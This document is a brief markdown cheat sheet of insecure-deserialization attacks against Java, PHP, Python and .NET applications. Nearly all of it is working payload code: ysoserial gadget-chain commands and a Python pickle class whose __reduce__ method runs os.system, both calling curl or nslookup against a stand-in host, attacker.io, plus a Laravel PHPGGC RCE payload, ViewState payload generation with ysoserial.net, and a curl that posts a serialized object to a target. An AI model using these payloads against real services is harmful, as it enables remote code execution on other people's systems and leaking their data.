# Deep Technical Procedures

## Java Deserialization Detection

```bash
# Check for Java serialization magic bytes
echo $SERIALIZED_DATA | base64 -d | xxd | head -1
# Look for: aced 0005

# Using ysoserial to generate payload
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.io/verify?hostname=$(hostname)' | base64

# Blind detection with DNS callback
java -jar ysoserial.jar CommonsCollections6 \
  "nslookup uniqueid.attacker.io" | base64 -w0
```

## PHP Deserialization Testing

```php
<?php
// PHPGGC payload generation
// phpggc Laravel/RCE 'system' 'whoami'
// Payload string
$payload = 'O:28:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"*events";a:1:{i:0;O:39:"Illuminate\\Notifications\\ChannelManager":3:{...}}'
?>

// Detection with error-based approach
// Submit modified serialized string
// O:1:"A":0:{} -> change to O:1:"A":1:{s:1:"x";N;}
```

## Python Pickle Exploitation

```python
import pickle
import os
import base64

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.io/rd?cmd=whoami',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(f"Pickle RCE payload: {payload}")
```

## .NET Deserialization

```powershell
# ysoserial.net payload generation
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelectorFromFile -c "calc.exe" -o base64

# ViewState deserialization
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "whoami" \
  --validationalg="SHA1" --validationkey="KEY_HERE" --generator="GENERATOR"
```

## Detection via Burp Intruder

```bash
# Java serialized object detection
curl -X POST https://target.com/api/deserialize \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @/tmp/java_payload.bin
```
